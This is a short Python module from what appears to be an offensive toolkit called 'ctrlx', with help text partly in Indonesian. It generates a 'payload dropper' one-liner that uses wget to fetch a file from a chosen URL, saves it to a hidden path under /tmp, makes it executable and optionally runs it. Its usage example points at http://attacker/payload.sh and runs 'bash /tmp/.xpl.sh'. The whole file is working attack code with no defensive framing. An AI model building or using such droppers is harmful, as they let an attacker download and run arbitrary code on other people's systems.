import argparse

def run(raw_args):
    parser = argparse.ArgumentParser(
        prog="ctrlx rda --type drop",
        description="Generate a one-liner payload downloader and executor",
        epilog="Contoh: python ctrlx.py rda --type drop --url http://attacker/payload.sh --path /tmp/.xpl.sh --exec 'bash /tmp/.xpl.sh' --save"
    )

    parser.add_argument("--url", required=True, help="URL payload yang akan diunduh")
    parser.add_argument("--path", default="/tmp/.payload.sh", help="Lokasi simpan file di sistem target")
    parser.add_argument("--exec", help="Perintah untuk menjalankan payload setelah diunduh")

    args = parser.parse_args(raw_args)

    dropper = f"wget {args.url} -O {args.path} && chmod +x {args.path}"
    if args.exec:
        dropper += f" && {args.exec}"

    return f"[Payload Dropper]\n{dropper}"